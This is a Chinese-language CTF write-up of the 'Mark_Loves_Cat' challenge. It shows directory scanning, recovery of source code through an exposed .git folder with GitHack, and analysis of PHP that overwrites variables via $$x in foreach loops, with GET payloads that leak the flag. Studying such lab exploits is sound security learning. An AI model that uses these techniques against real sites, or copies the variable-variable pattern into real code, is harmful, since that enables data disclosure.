---
title: Mark_Loves_Cat
date: 2023-10-28T18:14:37+08:00
slug: 38e9ef8
tags:
  - tools
  - tricks
categories:
  - CTF
---

打开靶场是一个非常正式的网页？到处扒拉一下，也在`contact`处进行了intruder测试，没有什么结果。

再查看页面代码和网络，也没有什么。所以又启动TOOLs。

那句话怎么说来着？`dirmap`一扫描起来，就发了狠……反正扫出很多东西。

<!--more-->

比较瞩目的是前排好多`zip`，`www`，`rar`，`bak`——因为之前一些靶场中，这些往往就是把源码下载到本地的URL。

```http

[200][application/octet-stream][137.00b] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/.git/config

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/admin.rar

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/2.rar

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/a.rar

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/2014.rar

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/2015.zip

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/bak.rar

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/bbs.zip

[200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/2.zip

...仅截取部分

```

  

不过这次一个个点开，没有一个进行下载任务。

目标转向第一个文件`/.git/`。<font size=1>如果用github clone或者配置过github pages+hexo那倒霉玩意的，可能有点熟悉这个是什么。</font>

  

出动`GitHack`

下载下来一个文件夹，里面有：

```txt

assets

flag.php

index.php

```

  

----

  

# $$x?第一次看还觉得很陌生……

  

`flag.php`中：

```php

<?php

  

$flag = file_get_contents('/flag');

```

  

在`index.php`中看到：

```php

<?php

  

include 'flag.php';

  

$yds = "dog";

$is = "cat";

$handsome = 'yds';

  

foreach($_POST as $x => $y){

    $$x = $y;

}

  

foreach($_GET as $x => $y){

    $$x = $$y;

}

  

foreach($_GET as $x => $y){

    if($_GET['flag'] === $x && $x !== 'flag'){

        exit($handsome);

    }

}

  

if(!isset($_GET['flag']) && !isset($_POST['flag'])){

    exit($yds);

}

  

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){

    exit($is);

}

  

echo "the flag is: ".$flag;

```

依旧是先translate一下：

- 1.包含`flag.php`文件

- 2.三个变量如代码所述不再重复

- 3.`foreach()`函数：用于遍历数组中的每个元素，并将当前元素的值赋给一个变量

    - 1）获取当前元素的键名（`$key`获取）：`foreach ($array as $key => $value）{// 执行操作}`

    - 2）遍历对象属性(`$key`获取当前属性名称，`$value`获取当前属性的值)：`foreach ($object as $key => $value) {// 执行操作}`

- 4.可变变量`$$x`：是一种特殊的语法，允许使用变量的值作为另一个变量的名称。`$a = 'hello';$b = 'a';echo $$b;  // 输出：hello`

  
  

----

  

# foreach()

  

```php

foreach($_POST as $x => $y){

    $$x = $y;

}

//POST传入ass=flag, $x=ass, $y=flag, $$x=$y=$ass=flag

  
  

foreach($_GET as $x => $y){

    $$x = $$y;

}

//GET传入ass=flag, $x=ass, $y=flag, $$y=$flag, $$x=$ass, $$x=$$y=$flag, $ass=$flag

```

## 1

  

```php

foreach($_GET as $x => $y){

    if($_GET['flag'] === $x && $x !== 'flag'){

        exit($handsome);

    }

}

```

  

GET传入`flag=?`，进行判断:

  

- 1.如果`$_GET['flag']`(获取通过 GET 请求方式传递的参数中名为 "flag" 的值的方法)等于`$x`

- 2.并且`$x`不等于flag就输出`$handsome`的值。

  

### payload

  

flag=ass,`$_GET['flag']`=ass, `$x`=flag, 不符合判断条件

  

flag=ass&ass=flag, 有两个键值对flag=>ass, ass=>flag，

  

- 1.`$_GET['flag']`=ass, `$x`=flag不成立——`ass!=flag && flag==flag`

- 2.`$_GET['flag']`=ass, `$x`=ass,成立——`ass===ass && ass!==flag`输出`$handsome`。

  
  

**最终Payload**

1.`?handsome=flag&flag=s&s=flag`：比较麻烦的一种，就是遵循上述逻辑

2.`?handsome=flag&flag=handsome`：最佳，没有把第二个foreach()忽略，使`$handsome`=`$flag`，同时引用上面的逻辑进行了解题。

  

## 2

  

```php

if(!isset($_GET['flag']) && !isset($_POST['flag'])){

    exit($yds);

}

//GET请求和POST请求中都没有名为 "flag" 的参数，则执行 exit($yds)

```

`?yds=flag`即可，原理是第二个foreach()

  

## 3

  

```php

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){

    exit($is);

}

//

```

  

`?flag=flag&is=flag`

  

----

  

POST没有变量$x=$y所以2和3（好像）都只有GET方式的解决方式。但是我昨天晚上记得随便POST传参yds=flag确实得到flag了。。。可能只是幻觉<br>如果问flag在哪里那我只能说，flag与你同在。

  
  

----

  

# ファンワイ Bypass

  

>GET传参，1默认类型为int，作为value时类型为string。

  

`?handsome=flag&flag=1&1=flag`：

flag=(string)1&(int)1=flag，所以就发生了一点Bypass——无法进入if判断语句，就绕过它。得到一个`the flag is:`。
